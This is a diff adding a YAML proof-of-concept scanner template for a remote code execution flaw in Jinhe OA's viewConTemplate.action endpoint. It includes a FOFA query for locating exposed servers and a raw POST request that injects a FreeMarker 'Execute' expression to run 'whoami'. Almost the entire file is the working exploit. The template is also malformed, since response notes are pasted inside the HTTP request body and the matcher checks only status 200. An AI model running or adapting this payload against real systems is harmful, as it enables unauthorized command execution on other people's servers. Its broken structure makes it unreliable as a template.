@@ -1,0 +1,42 @@
+id: poc-te724is6icz5v1zn
+info:
+  name: 金和OA viewConTemplate.action RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/te724is6icz5v1zn'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: te724is6icz5v1zn
+    fofa: app="金和网络-金和OA"|| body="JHSoft.Web.AddMenu"|| body="/jc6/platform/"
+http:
+- raw:
+  - 'POST /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    moduId=1&code=<clob>${"freemarker.template.utility.Execute"?new()("whoami")}</clob>&uuid=1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    clob
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
